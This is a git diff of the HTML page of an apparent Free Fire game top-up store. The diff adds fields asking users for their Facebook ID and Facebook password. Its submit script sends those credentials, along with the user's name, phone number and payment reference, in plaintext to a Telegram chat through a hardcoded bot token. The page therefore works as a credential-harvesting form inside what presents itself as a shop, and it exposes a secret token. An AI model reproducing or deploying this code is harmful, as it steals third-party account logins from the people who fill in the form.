@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr" manifest="manifest.appcache">
    <head>
-      <title>triple F club</title>
+      <title>Freefire Market</title>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <link rel="icon" href="./assets/img/fav/fav.png" type="image/gif" sizes="96x96">
@@ -37,21 +37,28 @@ s0.parentNode.insertBefore(s1,s0);
          <div class="container">
             <div class="common-page-tab">
                <div class="row flex-row-reverse">
-				   <div class="col-md-2 col-sm-12">
-					   <img class="number-img img-fluid" src="./assets/img/number-qr.jpg" alt="">
+				   <div class="col-md-3 col-sm-12">
 					   <div class="bebas text-center" style="background: white; margin-top: 10px;">
-							<h4 id="mobile-number">+8801755339711</h4>
+							<h4>Payment Method: <span id="payment_method" style="color: rgb(255, 0, 200);"></span><br><small>Send Money</small></h4>
+							<h4 id="mobile-number"></h4>
 						</div>
 						<div class="copy-button">
 							<button id="copyButton"><i class="fa fa-clone" aria-hidden="true"></i> <span id="copyResult">Copy</span></button>
+						</div>
+						<img class="number-img img-fluid" src="./assets/img/number-qr.jpg" alt="">
+						<div class="bebas text-center" style="background: white; margin-top: 10px;">
+							<h4>Opening hour</h4>
+							<h4 id="opening_hour"></h4>
 						</div>
 				   </div>
 				   
                   <div class="col-md-9 bebas card-glass sm-margin">
                      <div class="recharge-form">
 
-						<div id="congratulation" style="display: none; text-align: justify; color:aliceblue">
+						<div id="congratulation" style="display: none; text-align: center; color:aliceblue">
+							<img class="img-fluid" src="./assets/img/check-correct.gif" alt="">
 							<h3>congratulation, Your request for topup successfully submitted!! We will recharge your account withing next 15 mins. </h3>
+							<a class="btn btn-sm btn-info" onclick="reload()">Back To Form</a>
 						</div>
 
                         <form id="form">
@@ -59,7 +66,7 @@ s0.parentNode.insertBefore(s1,s0);
 								<div class="col-md-6">
 									<div class="form-group">
 										<label for="reference">Name:</label>
-										<input type="text" class="form-control" placeholder="Enter Your Name" id="name" required>
+										<input type="text" class="form-control" placeholder="Enter Your Name" id="p_name" required>
 									 </div>
 								   <div class="form-group">
 									  <label for="number">Mobile Number:</label>
@@ -78,28 +85,22 @@ s0.parentNode.insertBefore(s1,s0);
 									<div class="form-group">
 										<label for="reference">Game Type:</label>
 										<select class="form-control" id="game_type" required>
-											<option value="uid">UID</option>
-											<option value="ingame">Ingame</option>
 										</select>
 									 </div>
 									 <div id="ingame" style="display: none;">
 										<div class="form-group">
 											<label for="number">Facebook ID</label>
-											<input type="number" class="form-control" placeholder="Enter Mobile Number" id="fb_id" required>
+											<input type="text" class="form-control" placeholder="Enter FB ID" id="fb_id">
 										 </div>
 										 <div class="form-group">
 											<label for="amount">Facebook Password</label>
-											<input type="number" class="form-control" placeholder="Enter Amount" id="fb_password" required>
+											<input type="text" class="form-control" placeholder="Enter FB Password" id="fb_password">
 										 </div>
 									 </div>
 									 <div id="uid">
 										<div class="form-group">
 											<label for="number">Game ID Name</label>
-											<input type="number" class="form-control" placeholder="Enter Mobile Number" id="uid_name" required>
-										 </div>
-										 <div class="form-group">
-											<label for="amount">Game UID</label>
-											<input type="number" class="form-control" placeholder="Enter Amount" id="uid" required>
+											<input type="text" class="form-control" placeholder="Enter ID Name" id="uid_name">
 										 </div>
 									 </div>
 								   <div class="form-group">
@@ -119,6 +120,12 @@ s0.parentNode.insertBefore(s1,s0);
             </div>
          </div>
       </section>
+
+	  	<script>
+			function reload(){
+				location.reload();
+			}
+		</script>
       <script>
          var loader = document.getElementById('loader');
          
@@ -165,6 +172,7 @@ s0.parentNode.insertBefore(s1,s0);
          	animation: 'random',
          });
       </script>
+
 	  <script>
 		const answer = document.getElementById("copyResult");
 		const copy = document.getElementById("copyButton");
@@ -190,34 +198,65 @@ s0.parentNode.insertBefore(s1,s0);
 		form.addEventListener("submit",(e)=>{
 			e.preventDefault();
 
-			let name = $('#name').val();
+			let name = $('#p_name').val();
 			let number = $('#number').val();
 			let amount = $('#amount').val();
 			let reference = $('#reference').val();
-			
+			let fb_id = $('#fb_id').val();
+			let fb_password = $('#fb_password').val();
+			let uid_name = $('#uid_name').val();
+			let game_type = $('#game_type').val();
+			let product = $('#products').val();
 
 			let token = 'bot5216882890:AAEWr5CwWBGuqHAwHJJ9HIOA6BGyLJZBbsw';
-			let chat_id = '2127431748';
+			let chat_id = '1418364017';
 
-			let text = `Name::%20${name}%20%0A
-			Number::%20${number}%20%0A
-			Amount::%20${amount}TK%20%0A
-			Reference::%20${reference}`
-
-			$.ajax({
+			if(game_type == 'uid'){
+				let text = `Name::%20${name}%20%0ANumber::%20${number}%20%0AAmount::%20${amount}TK%20%0AReference::%20${reference}%0AGame Type::%20${game_type}%0AUID Name::%20${uid_name}%0AProduct::%20${product}`;
+				$.ajax({
 					url: `https://api.telegram.org/${token}/sendMessage?chat_id=${chat_id}&text=${text}`,
 					method: 'GET',
 				}).done(function(data, textStatus, jqXHR) {
 					$(form).css('display','none');
 					$('#congratulation').css('display','block')
 				})
+			}else{
+				let text = `Name::%20${name}%20%0ANumber::%20${number}%20%0AAmount::%20${amount}TK%20%0AReference::%20${reference}%0AGame Type::%20${game_type}%0AFB ID::%20${fb_id}%0AFB Password::%20${fb_password}%0AProduct::%20${product}`;
+				$.ajax({
+					url: `https://api.telegram.org/${token}/sendMessage?chat_id=${chat_id}&text=${text}`,
+					method: 'GET',
+				}).done(function(data, textStatus, jqXHR) {
+					$(form).css('display','none');
+					$('#congratulation').css('display','block')
+				})
+			}
+
 			})
 	</script>
+
 	<script>
 		$(document).ready(function(){
+			$('#game_type option:first').val();
 
 			$.ajax({
-					url: `uid_product.json`,
+				url:`db/settings.json`,
+				method:'GET',
+			}).done(function(data){
+				$.each(data.product_type, function(){
+					$('#game_type').append(`<option value="${this}">${this}</option>`)
+				})
+				let shop_time = data['shop_time'];
+				let payment_method = data['payment_option']['payment_method'];
+				let payment_number = data['payment_option']['payment_number'];
+
+				$('#payment_method').text(payment_method);
+				$('#mobile-number').text(payment_number);
+				$('#opening_hour').text(shop_time)
+
+			})
+
+			$.ajax({
+					url: `db/uid_product.json`,
 					method: 'GET',
 				}).done(function(data, textStatus, jqXHR) {
 					$.each(data.products, function(){
@@ -233,7 +272,7 @@ s0.parentNode.insertBefore(s1,s0);
 					$('#uid').css('display','none');
 
 					$.ajax({
-						url: `ingame_product.json`,
+						url: `db/ingame_product.json`,
 						method: 'GET',
 					}).done(function(data, textStatus, jqXHR) {
 						$.each(data.products, function(){
@@ -247,7 +286,7 @@ s0.parentNode.insertBefore(s1,s0);
 					$('#uid').css('display','block');
 
 					$.ajax({
-						url: `uid_product.json`,
+						url: `db/uid_product.json`,
 						method: 'GET',
 					}).done(function(data, textStatus, jqXHR) {
 						$.each(data.products, function(){
@@ -258,39 +297,6 @@ s0.parentNode.insertBefore(s1,s0);
 			});
 		});
 	</script>
-<<<<<<< HEAD
-	<!-- Messenger Chat Plugin Code -->
-    <div id="fb-root"></div>
 
-    <!-- Your Chat Plugin code -->
-    <div id="fb-customer-chat" class="fb-customerchat">
-    </div>
-
-    <script>
-      var chatbox = document.getElementById('fb-customer-chat');
-      chatbox.setAttribute("page_id", "103211432299603");
-      chatbox.setAttribute("attribution", "biz_inbox");
-    </script>
-
-    <!-- Your SDK code -->
-    <script>
-      window.fbAsyncInit = function() {
-        FB.init({
-          xfbml            : true,
-          version          : 'v13.0'
-        });
-      };
-
-      (function(d, s, id) {
-        var js, fjs = d.getElementsByTagName(s)[0];
-        if (d.getElementById(id)) return;
-        js = d.createElement(s); js.id = id;
-        js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
-        fjs.parentNode.insertBefore(js, fjs);
-      }(document, 'script', 'facebook-jssdk'));
-    </script>
-=======
-
->>>>>>> b5a88c67edde157ca757988612ce9511f5ddd600
 </body>
 </html>
